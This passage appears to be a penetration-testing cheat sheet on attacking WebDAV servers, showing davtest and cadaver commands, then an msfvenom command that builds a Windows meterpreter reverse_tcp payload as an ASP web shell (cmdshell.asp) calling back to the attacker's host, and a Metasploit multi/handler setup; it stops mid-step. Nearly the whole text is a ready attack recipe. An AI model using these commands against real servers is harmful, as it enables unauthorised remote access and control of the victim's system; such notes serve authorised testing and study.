```bash
davtest -url [url] -auth [user]:[pass]

cadaver [url]
```

## MSF
```bash
msfvenom -p windows/meterpreter/reverse_tcp -LHOST=[localhost IP] -LPORT=[localhost PORT] -f [asp|aspx] > cmdshell.asp 
```

Into the msfconsol
```bash
use multi/handler
```

Config the multi-handler